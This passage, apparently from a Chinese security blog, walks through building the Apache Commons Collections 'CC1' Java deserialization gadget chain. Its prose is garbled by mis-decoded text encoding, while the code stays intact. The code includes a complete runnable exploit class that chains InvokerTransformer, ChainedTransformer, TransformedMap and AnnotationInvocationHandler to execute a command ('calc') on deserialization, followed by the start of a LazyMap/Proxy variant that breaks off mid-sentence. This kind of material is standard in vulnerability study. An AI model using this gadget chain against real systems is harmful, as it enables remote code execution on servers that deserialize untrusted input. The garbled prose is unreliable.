ä¸ºcheckvalueé‡Œåªç”¨åˆ°äº†valuetransformer,æ‰€ä»¥keytransfomerå°±ä¸ºnull.</p><p>ä½†æ˜¯è¿™é‡Œè™½ç„¶æ˜¯èƒ½è°ƒç”¨åˆ°äº†transfomeræ–¹æ³•ï¼Œä½†æ˜¯checkvalueé‡Œçš„valueä¸å¯æ§ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç»§ç»­å»æ‰¾è°é‡Œé¢è°ƒç”¨äº†checkvalueæ–¹æ³•</p><p><img src="../images/image-20230317171128586.png" alt="image-20230317171128586"></p><p>åœ¨è¿™é‡Œå‘ç°äº†ä¸€ä¸ªæŠ½è±¡ç±»é‡Œè¾¹çš„setvalueæ˜¯è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜å‘ç°äº†è¿™ä¸ªæŠ½è±¡ç±»æ˜¯transformedMapçš„çˆ¶ç±»</p><p><img src="../images/image-20230317171449070.png" alt="image-20230317171449070"></p><p><img src="../images/image-20230317171308361.png" alt="image-20230317171308361"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±æ¥ç€å»æ‰¾è°è°ƒç”¨äº†setvalueæ–¹æ³•</p><p>è¿™é‡Œè¯æ˜¯åˆ©ç”¨MapEntryéå†æ¥è°ƒç”¨setvalueæ–¹æ³•çš„</p><p><img src="../images/image-20230317172617863.png" alt="image-20230317172617863"></p><p>è¿™æ ·å†™å°±èƒ½æˆåŠŸè°ƒç”¨setvalueäº†</p><p>é¦–å…ˆï¼Œè¿™é‡Œç»™hashmap.put(â€œkeyâ€,â€valueâ€)çš„åŸå› æ˜¯ç®€å•åˆ›å»ºä¸€ä¸ªkeyå€¼ï¼Œä¸ºäº†ä¸‹æ–¹çš„éå†æä¾›å†…å®¹ï¼Œä¸å†™çš„è¯å°±ä¸ä¼šè¿›è¡Œforå¾ªç¯é‡Œçš„éå†</p><p>è¿™é‡Œæ˜¯å…ˆforå¾ªç¯è¿›è¡Œéå†ï¼Œç„¶åè°ƒç”¨setvalue(è¿™ä¸ªæ—¶å€™çš„valueå€¼å·²ç»ä¼ è¿›å»äº†)é‡Œé¢çš„checkvalue,ç„¶åcheckvalueå°±ä¼šæ ¹æ®ä¼ çš„valuetransformerè¿›è¡Œè°ƒç”¨transfomer.</p><p>ç„¶åå°±ä¼šå¼¹è®¡ç®—å™¨äº†</p><p><strong>æ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­æ‰¾è°è°ƒç”¨äº†setvalueæ–¹æ³•</strong></p><p>è¿™é‡Œæœ€å¥½çš„æƒ³æ³•æ˜¯ç›´æ¥æ‰¾è°çš„readobjecté‡Œé¢è°ƒç”¨äº†setvalueæ–¹æ³•ï¼Œå¦‚æœæ²¡æ‰¾åˆ°çš„è¯å°±å’Œä¸Šé¢ä¸€æ ·çš„æ–¹æ³• ï¼Œçœ‹è°é‡Œé¢è°ƒç”¨äº†setvalueæ–¹æ³•ï¼Œæœ€åçš„å½’å®¿éƒ½æ˜¯æ‰¾readobjecté‡Œé¢è°ƒç”¨äº†xxxæ–¹æ³•</p><p><img src="../images/image-20230317175443088.png" alt="image-20230317175443088"></p><p><img src="../images/image-20230317175529057.png" alt="image-20230317175529057"></p><p>åœ¨è¿™ä¸ªç±»é‡Œè¾¹çš„æ–¹æ³•æ‰¾åˆ°äº†è°ƒç”¨setvalueçš„æ–¹æ³•</p><p><img src="../images/image-20230317175649684.png" alt="image-20230317175649684"></p><p>å¹¶ä¸”è¿™ä¸ªmemberValueså¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é™å®šè°ƒç”¨å“ªä¸ªç±»çš„setvalueæ–¹æ³•äº†</p><p>è¿™é‡Œæœ‰ä¸€ä¸ªå°é—®é¢˜å°±æ˜¯è¿™ä¸ªç±»ä¸æ˜¯publicç±»å‹ï¼Œæ˜¯ä¸€ä¸ªdefaultç±»å‹</p><p>é‚£ä¹ˆä¸èƒ½ç›´æ¥è°ƒç”¨äº†</p><p><img src="../images/image-20230317180005106.png" alt="image-20230317180005106"></p><p>å¿…é¡»å¾—åœ¨è¿™ä¸ªåŒ…é‡Œæ‰èƒ½è°ƒç”¨äº†ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±æ˜¯ç”¨åå°„çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨äº†</p><p><img src="../images/image-20230317184552260.png" alt="image-20230317184552260"></p><p>åå°„çš„æ–¹æ³•å°±å†™å¥½äº†ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆèƒ½ä¼ mapï¼Œæ˜¯å› ä¸ºè¿™ä¸ªsetvalueæ‰€åœ¨çš„ç±»æ˜¯transformedMapçš„çˆ¶ç±»ï¼Œç„¶åä¼ çš„mapæ˜¯TransformerMapç±»åˆ›å»ºçš„ï¼Œæ‰€ä»¥åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè°ƒç”¨åˆ°é‚£ä¸ªæŠ½è±¡ç±»é‡Œè¾¹çš„setvalueæ–¹æ³•ï¼Œè¿™é‡Œå†™çš„Overrideçš„åŸå› æ˜¯å› ä¸ºä¸‹å›¾çš„è¿™ä¸ªæ„é€ å‡½æ•°é‡Œè¾¹è¦æ±‚çš„æ³¨é‡Šclass</p><p><img src="../images/image-20230317185333816.png" alt="image-20230317185333816"></p><p>è¿™é‡Œæœ‰ä¸ªä¸å¥½çš„ç‚¹å°±æ˜¯valueæ²¡æ³•æ§åˆ¶ï¼Œæ‰€ä»¥å¾—æƒ³åŠæ³•æ¥ä¼ value</p><p>è¿˜æœ‰å°±æ˜¯è¿™é‡Œçš„Runtimeæ˜¯æ²¡æ³•è¿›è¡Œåºåˆ—åŒ–çš„(å› ä¸ºæ²¡æœ‰ç»§æ‰¿serializeble)</p><p><img src="../images/image-20230317194226941.png" alt="image-20230317194226941"></p><p>è¿˜æœ‰å°±æ˜¯è¿™é‡Œçš„ä¸¤ä¸ªifä¹Ÿè¦åˆ¤æ–­ç»•è¿‡</p><p><img src="../images/image-20230317194329316.png" alt="image-20230317194329316"></p><p>æ‰€ä»¥ä¸Šé¢ä¸€å…±æœ‰ä¸‰ä¸ªé—®é¢˜è¦è¿›è¡Œè§£å†³</p><p><strong>å…ˆè§£å†³runtimeåºåˆ—åŒ–é—®é¢˜</strong></p><p>è¿™é‡Œçš„è¯å…ˆå†™å‡ºåå°„çš„æ–¹æ³•ï¼Œç„¶ååœ¨å†™åˆ°<code>InvokerTransformer</code>ä¸Š</p><p><img src="../images/image-20230317195857622.png" alt="image-20230317195857622"></p><p>å› ä¸ºclassèƒ½è¿›è¡Œåºåˆ—åŒ–ï¼Œè€ŒRuntimeä¸è¡Œï¼Œæ‰€ä»¥å°±ä½¿ç”¨åå°„æ¥å†™</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠè¿™æ®µä»£ç ä¸InvokerTransformerç»“åˆæ¥å†™</p><p>è¿™ä¹Ÿæ˜¯ä¸ªåå°„æ–¹æ³•(å†™åœ¨å‡½æ•°å†…éƒ¨çš„)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230317202145679.png" alt="image-20230317202145679"></p><p><img src="../images/image-20230317202207893.png" alt="image-20230317202207893"></p><p>è¿™æ®µä»£ç å†™çš„æœ‰ç‚¹ç»•ï¼Œå°±æ˜¯åˆ©ç”¨InvokerTransformerç±»é‡Œè¾¹transformçš„åå°„åœ¨åˆ©ç”¨ä¸€éï¼Œå°±æ˜¯åˆ©ç”¨åå°„è·å–åˆ°Runtime.classçš„getMethodæ–¹æ³•ï¼Œç„¶åç¬¬äºŒä½ç½®å°±æ˜¯ä¼ å‚æ•°ï¼Œç¬¬ä¸‰ä½ç½®å°±æ˜¯ä¼ invokeéœ€è¦çš„ä¸œè¥¿ï¼Œå°±æ˜¯æœ‰ç‚¹åµŒå¥—çš„æ„Ÿè§‰ï¼Œæ…¢æ…¢çœ‹å°±èƒ½æŠŠè¿™ä¸ªä»£ç çœ‹æ‡‚äº†</p><p>å°±æ˜¯æ ¹æ®ï¼Œæ²¡ç”¨InvokerTransformerä¹‹å‰å†™çš„runtimeåå°„ä»£ç æ¥å†™ï¼Œä¸€æ­¥ä¸€æ­¥ç”¨InvokerTransformeræ¥å†™åå°„æ¥è¿›è¡Œæ›¿æ¢</p><p>æ¥ä¸‹æ¥å°±åˆ°æ›¿æ¢invokeäº†<img src="../images/image-20230317202631561.png" alt="image-20230317202631561"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(method);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå’Œä¸Šé¢çš„ç¬¬ä¸€æ¬¡è§£é‡Šä¸€æ ·ï¼Œä¹Ÿæ˜¯å’ŒåµŒå¥—ä¸€æ ·</p><p>ä¸Šé¢æ˜¯åˆ°Runtime.getRuntime()äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥ç›´æ¥å†™â€execâ€ç›´æ¥åå°„è°ƒç”¨å¼¹è®¡ç®—å™¨äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>è¿™å¥ä»£ç å°±æ²¡é‚£ä¹ˆæŠ½è±¡äº†ï¼Œä¸åƒå‰ä¸¤ä¸ªé‚£ä¹ˆæŠ½è±¡</p><p><img src="../images/image-20230317204314863.png" alt="image-20230317204314863"></p><p>è¿™å°±æ˜¯æ›¿æ¢æ‰ä¹‹å‰å†™çš„æ²¡åŠ InvokerTransformerçš„åå°„è°ƒç”¨äº†ï¼Œç„¶åå°±å¯ä»¥å¼¹è®¡ç®—å™¨äº†</p><p>è¿™é‡Œè¿˜æš´éœ²äº†ä¸€ä¸ªå¼Šç«¯å°±æ˜¯è€æ˜¯åµŒå¥—ç”¨æ³•ï¼Œå‰ä¸€ä¸ªè°ƒç”¨åä¸€ä¸ªï¼Œè€æ˜¯è°ƒç”¨tranformeré‡Œé¢çš„åå°„ï¼Œæ‰€ä»¥è¿™é‡Œå°±åˆ©ç”¨<code>ChainedTransformer</code>æ¥è§£å†³è¿™ä¸ªé—®é¢˜</p><p><img src="../images/image-20230317205703565.png" alt="image-20230317205703565"></p><p>å°±æ˜¯å›¾ç‰‡ä¸Šä¸¤ä¸ªå‡½æ•°ï¼Œå°±æ˜¯é è¿™ä¸¤ä¸ªæ¥è¿›è¡Œæ›¿æ¢æ‰</p><p><img src="../images/image-20230317210240200.png" alt="image-20230317210240200"></p><p>ç„¶åå°±å†™å¥½äº†è¿™é‡Œå°±åªæœ‰Runtime.classæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå…¶ä»–åªæ˜¯èµ·ä¸ªå˜é‡åçš„ä½œç”¨è€Œå·²</p><p>è§£å†³å®ŒRuntimeä¸èƒ½ååºåˆ—åŒ–åï¼Œè¿™é‡Œå°±å¾—è§£å†³é‚£ä¸¤ä¸ªifåˆ¤æ–­çš„é—®é¢˜äº†</p><p><strong>ç»•è¿‡ifä¸¤ä¸ªåˆ¤æ–­</strong></p><p><img src="../images/image-20230317211434930.png" alt="image-20230317211434930"></p><p>è¿™é‡Œçš„memberValueæ˜¯ä¼ è¿›æ¥çš„mapï¼Œåœ¨å¤–é¢å·²ç»å®šä¹‰å¥½äº†</p><p><img src="../images/image-20230317214237583.png" alt="image-20230317214237583"></p><p>å¹¶ä¸”å·²ç»æœ‰keyå€¼äº†ï¼Œä½†æ˜¯å› ä¸ºè¿™é‡Œçš„keyæ‰¾çš„æ˜¯mapé‡Œçš„ï¼Œä½†æ˜¯æ‰¾è¿™ä¸ªkeyå€¼å´æ˜¯memberTypeçš„ï¼Œå°±Overrideè¿™ä¸ªä¸œè¥¿ï¼Œè¿™ä¸ªä¸œè¥¿æ˜¯æ²¡æœ‰value()å€¼çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æ¢ä¸€ä¸ªæ³¨é‡Šå‡½æ•°</p><p><img src="../images/image-20230317214436564.png" alt="image-20230317214436564"></p><p>è¿™ä¸ªæ˜¯æœ‰value()å€¼çš„ï¼Œåå­—ä¹Ÿä¸ºvalueï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æƒ³ç€æŠŠ<code>hashMap.put(&quot;key&quot;,&quot;aaa&quot;);</code>æ”¹ä¸º<code>hashMap.put(&quot;value&quot;,&quot;aaa&quot;);</code>é‚£ä¹ˆå°±èƒ½ç»•è¿‡åˆ¤æ–­äº†</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±å‰©valueçš„å€¼æ€ä¹ˆè¿›è¡Œæ§åˆ¶äº†</p><p><strong>æ§åˆ¶setvalueé‡Œçš„valueå€¼</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ª<code>ConstantTransformer</code>ç±»æ¥è¿›è¡Œè§£å†³è¿™ä¸ªé—®é¢˜</p><p><img src="../images/image-20230317215731924.png" alt="image-20230317215731924"></p><p>å°±æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œä¸ç®¡transformä¼ å•¥å€¼ï¼Œæœ€åè¿”å›çš„éƒ½æ˜¯å›ºå®šçš„ä¸œè¥¿ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ§åˆ¶è¿™ä¸ªå›ºå®šçš„ä¸œè¥¿å°±è¡Œ</p><p><img src="../images/image-20230317220314223.png" alt="image-20230317220314223"></p><p>æ–°å¢åŠ è¿™ä¸€è¡Œå°±è§£å†³äº†è¿™ä¸ªvalueä¸èƒ½æ§åˆ¶çš„é—®é¢˜äº†ï¼Œå°±æ˜¯åœ¨setvalueè°ƒç”¨åˆ°checkvalueé‚£è¾¹çš„æ—¶å€™ï¼Œç„¶åå°±ä¼šè°ƒç”¨<code>chainedTransformer.transformer</code>æ–¹æ³•ï¼Œç„¶åå› ä¸ºåœ¨æ•°ç»„ä¸­å› ä¸ºæœ‰<code>ConstantTransformer(Runtime.class)</code>å­˜åœ¨å°±ä¼šè°ƒç”¨<code>ConstantTransformer.transformer</code>,ç„¶åå°±ä¼šè¿”å›ä¸€ä¸ªRuntime.class,é‚£ä¹ˆè¿™ä¸ªvalueå°±æˆåŠŸå¯æ§äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¾ªç¯åµŒå¥—äº†ï¼Œåå­—å½±å“ä¸å¤§</p><p>è¿™é‡Œä¸ç®¡<code>chainedTransformer.transformer</code>ä¼ è¿›æ¥ä»€ä¹ˆvalueï¼Œ<code>ConstantTransformer.transformer</code>éƒ½ä¼šå›ºå®šè¿”å›Runtime.class</p><p><strong>ç„¶åå°±å…¨éƒ¨è·Ÿå®Œäº†</strong></p><p><strong>cc1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.commons.Method;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="comment">//import java.lang.reflect.Method;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//         InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        Method method = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null &#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(method);</span></span><br><span class="line"><span class="comment">//            new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span> &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//     chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">         <span class="comment">//Class c = Runtime.class;</span></span><br><span class="line">          <span class="comment">//Method method =  c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">          <span class="comment">//Runtime r = (Runtime) method.invoke(null,null); //getRuntimeæ˜¯æ— å‚å‡½æ•°</span></span><br><span class="line"><span class="comment">//          Method method1 = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//          method1.invoke(r,&quot;calc&quot;);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; map = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="comment">////        for (Map.Entry entry:map.entrySet())</span></span><br><span class="line"><span class="comment">////        &#123;</span></span><br><span class="line"><span class="comment">////            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">////        &#125;</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span>  <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,map);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šé¢å†™çš„éå¸¸è¯¦ç»†äº†ï¼Œæœ‰ç–‘é—®çš„æ—¶å€™å¯ä»¥å›æ¥æ¸©ä¹ ä¸€ä¸‹</p><p><strong>æ¥ä¸‹æ¥è¿˜æœ‰ä¸ªlazyMapç‰ˆæœ¬</strong></p><p>æˆ‘ä»¬åœ¨ä¸Šé¢å†™çš„æ˜¯<code>TransformedMap</code>ç‰ˆæœ¬ï¼Œå› ä¸ºåœ¨çœ‹è°è°ƒç”¨äº†transformerçš„æ—¶å€™ï¼Œå‘ç°äº†è¿˜æœ‰lazyMapè¿™ä¸ªç±»ï¼Œç„¶ååˆå·§å¦™çš„å‘ç°äº†è¿™ä¸ªç±»å¯ä»¥ç”¨ï¼Œäºæ˜¯å°±æœ‰äº†è¿™ä¸ªç‰ˆæœ¬</p><p><img src="../images/image-20230318103058344.png" alt="image-20230318103058344"></p><p>lazyMapçš„get()æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å’Œä¸Šé¢çš„æ€è·¯ä¸€æ ·ï¼Œæ‰¾è°è°ƒç”¨äº†get()æ–¹æ³•</p><p><img src="../images/image-20230318103911715.png" alt="image-20230318103911715"></p><p>ç„¶ååœ¨è¿™ä¸ªç±»é‡Œè¾¹å‘ç°äº†getæ–¹æ³•ï¼Œå¹¶ä¸”è¿™ä¸ªmemberValueå¯æ§</p><p><img src="../images/image-20230318104007111.png" alt="image-20230318104007111"></p><p>æ˜¯åœ¨è¿™ä¸ªinvokeæ–¹æ³•é‡Œé¢</p><p>æ‰€ä»¥è¿™é‡Œå¾—ç”¨åŠ¨æ€ä»£ç†æ–¹æ³•</p><p>æ€è·¯å°±æ˜¯<code>AnnotationInvocationHandler.readObject</code>é‡Œé¢ä¼ ä¸€ä¸ªåŠ¨æ€ä»£ç†æ–¹æ³•ï¼Œç„¶ååŠ¨æ€ä»£ç†å°±ä¼šä½¿ç”¨invokeï¼Œinvokeé‡Œé¢å°±ä¼šè°ƒç”¨lazyMap.getæ–¹æ³•(å› ä¸ºmemberValueså¯æ§)ï¼Œç„¶ågetæ–¹æ³•é‡Œé¢å°±ä¼ ä¸€ä¸ª<code>chainedTransformer</code>(geté‡Œé¢è°ƒç”¨äº†transfomæ–¹æ³•),ç„¶åå°±èƒ½å¼¹è®¡ç®—å™¨äº†</p><p><img src="../images/image-20230318110547425.png" alt="image-20230318110547425"></p><p>å†™å¥½äº†ï¼Œè¿›è¡Œå¯¹è¿™æ®µä»£ç è¿›è¡Œè§£é‡Šä¸€ä¸‹</p><p>è¿™é‡Œçš„LazyMapçš„decorateæ–¹æ³•å’ŒTransformedMap.decorateæ–¹æ³•æ˜¯ä¸€ä¸ªæ„æ€ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œä¸‹é¢çš„å®ä¾‹åŒ–å¯¹è±¡ä½¿ç”¨InvocationHandleræ˜¯å› ä¸ºreadObjectæ‰€åœ¨çš„AnnotationInvocationHandleræ˜¯ç»§æ‰¿äºInvocationHandlerçš„(è¿˜æœ‰ä¸€ç‚¹æ˜¯ä¸èƒ½ä½¿ç”¨è¿™ä¸ªAnnotationInvocationHandler    å¯ä»¥è‡ªå·±å»ideaé‡Œé¢è¯•ä¸€ä¸‹)  </p><p>è¿™é‡Œä¼ çš„lazyMapå°±æ˜¯å¯æ§çš„memberValues,åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¿™ä¸ªmemberValueså°±ä¼šè°ƒç”¨è¿™ä¸ªentrySet()æ–¹æ³•ï¼Œå› ä¸ºè¿™ä¸ªæ–¹æ³•æ˜¯æ— å‚çš„ï¼Œèƒ½ç¬¦åˆæ¥ä¸‹æ¥åŠ¨æ€ä»£ç†è°ƒç”¨çš„invokeæ–¹æ³•é‡Œè°ƒç”¨getçš„æ¡ä»¶ï¼Œä¸‹é¢é‚£è¡Œå†™çš„<code>xProxy.newProxyInstance(h.getClass().getClassLoader(), h.getClass().getInterfaces(),h);</code>æ–¹æ³•å°±æ˜¯ä¸ºäº†è°ƒç”¨invokeæ–¹æ³•ï¼Œä»è€Œè°ƒç”¨åˆ°lazymapé‡Œçš„getæ–¹æ³•ï¼Œç„¶ågetçš„æ–¹æ³•å°±ä¼šè°ƒç”¨chainedTransformer.tranfomeæ–¹æ³•ï¼Œä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œã€‚</p><p><img src="../images/image-20230318112157242.png" alt="image-20230318112157242"></p><p>æœ€åå†è¡¥å……ä¸€ç‚¹å°±å®Œæˆäº†</p><p>å› ä¸ºæˆ‘ä»¬æ˜¯æƒ³åœ¨readObjecté‡Œé¢æ‰§è¡Œï¼Œç„¶ååˆšå¥½readobjectæ‰€åœ¨çš„è¿™ä¸ªç±»æ˜¯æ¥æ”¶mapç±»çš„ï¼Œç„¶ååŠ¨æ€ä»£ç†çš„è¯æ˜¯å¿…é¡»å¾—è·Ÿä¸€ä¸ªæ¥å£çš„ï¼Œæ‰€ä»¥å°±<code>Map map = (Map) Proxy.newProxyInstance(h.getClass().getClassLoader(), h.getClass().getInterfaces(),h);</code>è¿™æ 